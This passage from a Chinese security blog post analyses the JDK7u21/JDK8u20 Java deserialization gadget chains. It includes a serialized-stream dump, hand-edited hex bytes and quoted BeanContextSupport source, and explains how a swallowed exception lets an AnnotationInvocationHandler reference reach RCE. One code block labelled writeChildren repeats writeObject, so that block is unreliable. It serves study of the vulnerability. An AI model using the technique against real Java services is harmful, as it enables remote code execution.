class="hljs-meta">@ObjectAnnotation</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">45</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">2d</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.AnnotationInvocationHandler - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">41</span> 6e 6e <span class="hljs-number">6f</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">49</span> 6e <span class="hljs-number">76</span> <span class="hljs-number">6f</span> <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">48</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0a<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257538</span> <br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            <span class="hljs-meta">@Value</span> - zero - <span class="hljs-number">0x7a</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257539</span>  <br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>  TC_REFERENCE - <span class="hljs-number">0x71</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> <br></code></pre></td></tr></table></figure>

<p>因为@Handler时自动生成的，所以我们构造数据的时候要丢弃newhandle对应的十六进制数据</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aced</span> <span class="hljs-number">0005</span> <span class="hljs-number">7372</span> <span class="hljs-number">0024</span> <span class="hljs-number">7973</span> <span class="hljs-number">6</span>f73 <span class="hljs-number">6572</span> <span class="hljs-number">6961</span> <br><span class="hljs-attribute">6c2e</span> <span class="hljs-number">6</span>a64 <span class="hljs-number">6</span>b38 <span class="hljs-number">7532</span> <span class="hljs-number">302</span>e <span class="hljs-number">4265</span> <span class="hljs-number">616</span>e <span class="hljs-number">436</span>f <br><span class="hljs-attribute">6e74</span> <span class="hljs-number">6578</span> <span class="hljs-number">7453</span> <span class="hljs-number">7570</span> <span class="hljs-number">706</span>f <span class="hljs-number">7274</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <br><span class="hljs-attribute">0000</span> <span class="hljs-number">0014</span> <span class="hljs-number">0300</span> <span class="hljs-number">0078</span> <span class="hljs-number">7073</span> <span class="hljs-number">7200</span> <span class="hljs-number">2</span>d79 <span class="hljs-number">736</span>f <br><span class="hljs-attribute">7365</span> <span class="hljs-number">7269</span> <span class="hljs-number">616</span>c <span class="hljs-number">2</span>e6a <span class="hljs-number">646</span>b <span class="hljs-number">3875</span> <span class="hljs-number">3230</span> <span class="hljs-number">2</span>e41 <br><span class="hljs-attribute">6e6e</span> <span class="hljs-number">6</span>f74 <span class="hljs-number">6174</span> <span class="hljs-number">696</span>f <span class="hljs-number">6</span>e49 <span class="hljs-number">6</span>e76 <span class="hljs-number">6</span>f63 <span class="hljs-number">6174</span> <br><span class="hljs-attribute">696f</span> <span class="hljs-number">6</span>e48 <span class="hljs-number">616</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6572</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <br><span class="hljs-attribute">000a</span> <span class="hljs-number">0200</span> <span class="hljs-number">0149</span> <span class="hljs-number">0004</span> <span class="hljs-number">7</span>a65 <span class="hljs-number">726</span>f <span class="hljs-number">7870</span> <span class="hljs-number">0000</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">7871</span><br></code></pre></td></tr></table></figure>



<h2 id="实际分析"><a href="#实际分析" class="headerlink" title="实际分析"></a>实际分析</h2><p>我们在<code>jdk8u20漏洞原理</code>部分提到<code>逃过异常抛出</code>是该漏洞的关键所在，又经过上面一个case的分析，现在再来看看如何逃过异常抛出呢？没错，就是在<code>jdk</code>源码中找到一个类似于该<code>case</code>中的<code>BeanContextSupport</code>类，让<code>BeanContextSupport</code>成为外层，去调用<code>jdk</code>源码中的<code>AnnotationInvocationHandler</code>类，这样一来没有异常抛出就能够使反序列化流程不被终止，成功组成新的gadget链，完成一次完美的反序列化漏洞攻击。</p>
<p>那么在<code>jdk</code>源码中到底有没有一个类似于该<code>case</code>中的<code>BeanContextSupport</code>类？答案是显而易见的，其实为了方便读者理解此处的内容，我在case中就把这个类的名称给了出来——是的，就是<code> java.beans.beancontext.BeanContextSuppor</code>类，我们利用的是该类中的<code>readChildren</code>方法，来具体看看：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readChildren</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> serializable;<br>       <span class="hljs-keyword">while</span> (count-- &gt; <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-type">Object</span>                      <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>           BeanContextSupport.<span class="hljs-type">BCSChild</span> <span class="hljs-variable">bscc</span>  <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-keyword">try</span> &#123;<br>               child = ois.readObject();<br>               bscc  = (BeanContextSupport.BCSChild)ois.readObject();<br>           &#125; <span class="hljs-keyword">catch</span> (IOException ioe) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br>           <span class="hljs-keyword">synchronized</span>(child) &#123;<br>               <span class="hljs-type">BeanContextChild</span> <span class="hljs-variable">bcc</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   bcc = (BeanContextChild)child;<br>               &#125; <span class="hljs-keyword">catch</span> (ClassCastException cce) &#123;<br>                   <span class="hljs-comment">// do nothing;</span><br>               &#125;<br>               <span class="hljs-keyword">if</span> (bcc != <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-keyword">try</span> &#123;<br>                       bcc.setBeanContext(getBeanContextPeer());<br><br>                      bcc.addPropertyChangeListener(<span class="hljs-string">&quot;beanContext&quot;</span>, childPCL);<br>                      bcc.addVetoableChangeListener(<span class="hljs-string">&quot;beanContext&quot;</span>, childVCL);<br><br>                   &#125; <span class="hljs-keyword">catch</span> (PropertyVetoException pve) &#123;<br>                       <span class="hljs-keyword">continue</span>;<br>                   &#125;<br>               &#125;<br>               childDeserializedHook(child, bscc);<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，在该方法的第7行，对传入进来的<code>ObjectInputStream</code>对象调用了<code>readObject</code>方法进行反序列化处理，并且当在反序列化过程中如果出现异常，采用的是<code>continue</code>处理。完美的符合我们的要求。</p>
<p>我们在上文中提到<code>ObjectAnnotation</code>这个概念，并且其实可以发现，如果存在<code>ObjectAnnotation</code>结构，那么一般是由<code>TC_ENDBLOCKDATA - 0x78</code>去标记结尾的，但是这里其实存在一个问题，我们知道在jdk7u21修复中是因为<code>IllegalArgumentException</code>异常被捕获后抛出了<code>java.io.InvalidObjectException</code>，虽然这里我们可以利用<code>BeanContextSupport</code>来强制序列化流程继续下去，但是抛出的异常会导致<code>BeanContextSupport</code>的<code>ObjectAnnotation</code>中<code>TC_ENDBLOCKDATA - 0x78</code>结尾标志无法被正常处理，如果我们不手动删除这个<code>TC_ENDBLOCKDATA - 0x78</code>那么会导致后面的结构归在<code>ObjectAnnotation</code>结构中，从而读取错误，反序列化出来的数据不是我们预期数据。所以我们在生成<code>BeanContextSupport</code>的<code>ObjectAnnotation</code>中不能按照正规的序列化结构，需要将标记结尾的结构<code>TC_ENDBLOCKDATA - 0x78</code>删除</p>
<p>也正由于我们把<code>TC_ENDBLOCKDATA - 0x78</code>删除了，会导致我们在使用<code>SerializationDumper</code>工具查看<code>jdk8u20</code>的序列化数据结构出错，如下图所示：</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415223523459.png" srcset="/img/loading.gif" lazyload alt="image-20230415223523459"> </p>
<p>这里还有一个tips点，就是我们在插入<code>BeanContextSupport</code>对象的时候并不是像case中那样直接插入，而是借用假属性的概念插入。在<code>成员抛弃</code>中我们提到</p>
<blockquote>
<p>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，<strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。</strong></p>
</blockquote>
<p>所以我们插入一个任意类型为<code>BeanContextSupport</code>的字段就可以在不影响原有的序列化流程的情况下，形成一个gadget链</p>
<p>这里可能有点难以理解，多说一点</p>
<p>我们知道一般gadget链是一链接着一链紧紧相连，通过写各种类之间的调用，就能够满足整个gadget链的要求，实现整个gadget链的相连。但在jdk8u20中，并非如此，因为<code>LinkedHashSet</code>没法在<strong>满足绕过异常抛出的条件下</strong>直接调用<code>BeanContextSupport</code>方法，但是<code>BeanContextSupport</code>可以调用<code>AnnotationInvocationHandler</code>方法，这也就导致我们的gadget链在<code>LinkedHashSet</code>下一步断了，那怎么办？</p>
<p>只能通过修改序列化数据结构的方式，在<code>LinkedHashSet</code>中强行插入一个<code>BeanContextSupport</code>类型的字段值，由于在java反序列化的流程中，一般都是首先还原对象中字段的值，然后才会还原<code>objectAnnotation</code>结构中的值（即是按照序列化数据结构的顺序），所以它会首先反序列化<code>LinkedHashSet</code>，然后反序列<code>LinkedHashSet</code>字段的值，由于在这个字段值中有一个<code>BeanContextSupport</code>类型的字段，所以反序列化会去还原<code>BeanContextSupport</code>对象，也就是<code>objectAnnotation</code>中的数据</p>
<p>在反序列化<code>BeanContextSupport</code>的过程中，会首先反序列化<code>BeanContextSupport</code>的字段值，其中有个值为<code> Templates.class</code> 的 <code>AnnotationInvocationHandler</code> 类的对象的字段，然后反序列化会去还原<code>AnnotationInvocationHandler</code>对象，成功的关联了下一个链！</p>
<p>最后就是同<code>Jdk7u21</code>一样的流程，利用动态代理触发<code>Proxy.equals(EvilTemplates.class)</code>，达到恶意类注入实现RCE的最终目的</p>
<p>先看修复过后的<code>AnnotationInvocationHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    var1.defaultReadObject();<br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var2 = AnnotationType.getInstance(<span class="hljs-built_in">this</span>.type);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br><span class="hljs-comment">// ...</span><br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>JDK7u21的利用链如下，分别反序列化两个类，然后在put的方法中触发proxy的invoke</p>
<p>JDK8u20这条链的思路是增加一个不存在的field字段，这个字段中是一个序列化类，它包裹住<code>AnnotationInvocationHandler</code>，catch住<code>AnnotationInvocationHandler</code>反序列化过程中的异常，并且在后续的反序列化中不报错，它会被正常反序列化。然后在需要<code>AnnotationInvocationHandler</code>的时候，替换为之前field反序列化中生成的<code>AnnotationInvocationHandler</code>的<code>reference</code>。</p>
<p>这个field字段可以加在两个地方，一个是HashSet的field字段，另一个是hashSet的成员的field。</p>
<p>利用链如下</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414222627594.png" srcset="/img/loading.gif" lazyload alt="image-20230414222627594"> </p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414222652854.png" srcset="/img/loading.gif" lazyload alt="image-20230414222652854"> </p>
<p>如果把<code>AnnotationInvocationHandler#readObject</code>当成内层try catch嵌套在外层<code>try catch</code>中，反序列化的时候会在内存中留下完整的<code>AnnotationInvocationHandler</code>和对应的handler。而此后在真正需要用到<code>AnnotationInvocationHandler</code>的时候，<code>ObjectInputStream</code>会直接引用这个<code>handler</code>。</p>
<p>也就是说，如果你把<code>readObject</code>方法放在一个嵌套的try-catch块中，而且在反序列化过程中发生了异常，那么内层的catch块会处理异常，但是外层的try块会继续执行。这意味着<code>AnnotationInvocationHandler</code>对象和它的handler（一个从属性到值的映射）会留在内存中，即使它们没有完全初始化或验证。后来，当<code>AnnotationInvocationHandler</code>对象被另一个类（比如<code>ObjectInputStream</code>）使用时，它会直接引用<code>handler</code>映射，而不检查它的内容。这可能导致任意代码执行，如果<code>handler</code>映射包含了恶意的值</p>
<p>所以需要找到一个<code>readObject</code>流程里有<code>try catch</code>且不影响反序列化流程的类。</p>
<p>如<code>java.beans.beancontext.BeanContextSupport</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">#BeanContextSupport#readObject<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>    <span class="hljs-keyword">synchronized</span>(BeanContext.globalHierarchyLock) &#123;<br>        ois.defaultReadObject();<br><br>        initialize();<br><br>        bcsPreDeserializationHook(ois);<br><br>        <span class="hljs-keyword">if</span> (serializable &amp;gt; <span class="hljs-number">0</span> &amp;amp;&amp;amp; <span class="hljs-built_in">this</span>.equals(getBeanContextPeer()))<br>            readChildren(ois);<span class="hljs-comment">//继续跟进readChilren</span><br><br>        deserialize(ois, bcmListeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(<span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">#BeanContextSupport#readChildren<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readChildren</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> serializable;<br><br>    <span class="hljs-keyword">while</span> (count-- &amp;gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">Object</span>                      <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        BeanContextSupport.<span class="hljs-type">BCSChild</span> <span class="hljs-variable">bscc</span>  <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            child = ois.readObject();<br>            bscc  = (BeanContextSupport.BCSChild)ois.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException ioe) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br><span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到在<code>readChildren</code>方法中,在执行<code>ois.readObject()</code>时,这里try catch了,但是没有把异常抛出来,程序会接着执行。如果这里可以把<code>AnnotationInvocationHandler</code>对象在<code>BeanContextSupport</code>类第二次<code>writeObject</code>的时候写入<code>AnnotationInvocationHandler</code>对象,这样反序列化时,即使<code>AnnotationInvocationHandler</code>对象 <code>this.type</code>的值为<code>Templates</code>类型也不会报错。</p>
<p>让<code>child = ois.readObject();</code>这一行读取AnnotationInvocationHandler，之后的catch并不影响反序列化流程，完美符合要求。</p>
<p>于是接下来的思路就很明确了：在最终LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。</p>
<p>先看看为了使<code>child = ois.readObject();</code>读取想要的AnnotationInvocationHandler需要做什么</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport#writeObject<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    serializing = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">synchronized</span> (BeanContext.globalHierarchyLock) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            oos.defaultWriteObject(); <span class="hljs-comment">// serialize the BeanContextSupport object</span><br><br>            bcsPreSerializationHook(oos);<br><br>            <span class="hljs-keyword">if</span> (serializable &amp;gt; <span class="hljs-number">0</span> &amp;amp;&amp;amp; <span class="hljs-built_in">this</span>.equals(getBeanContextPeer()))<br>                writeChildren(oos);<br><br>            serialize(oos, (Collection)bcmListeners);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            serializing = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport#writeChildren<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    serializing = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">synchronized</span> (BeanContext.globalHierarchyLock) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            oos.defaultWriteObject(); <span class="hljs-comment">// serialize the BeanContextSupport object</span><br><br>            bcsPreSerializationHook(oos);<br><br>            <span class="hljs-keyword">if</span> (serializable &amp;gt; <span class="hljs-number">0</span> &amp;amp;&amp;amp; <span class="hljs-built_in">this</span>.equals(getBeanContextPeer()))<br>                writeChildren(oos);<br><br>            serialize(oos, (Collection)bcmListeners);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            serializing = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport.children<br> <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * all accesses to the &lt;code&gt; protected HashMap children &lt;/code&gt; field</span><br><span class="hljs-comment">     * shall be synchronized on that object.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">transient</span> HashMap         children;<br></code></pre></td></tr></table></figure>


              
            </div>
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>7U21与8U20</div>
      <div>https://decemberus.com/2023/03/12/原生JDK7u21与8u20/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Decemberus</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年3月12日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/03/16/JMX%E5%AD%A6%E4%B9%A0/" title="JMX学习">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">JMX学习</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/02/01/JackSon%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JackSon使用及其反序列化">
                        <span class="hidden-mobile">JackSon使用及其反序列化</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>






  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script>
  (function() {
    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
    var enableCopy = CONFIG.copy_btn;
    if (!enableLang && !enableCopy) {
      return;
    }

    function getBgClass(ele) {
      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
    }

    var copyTmpl = '';
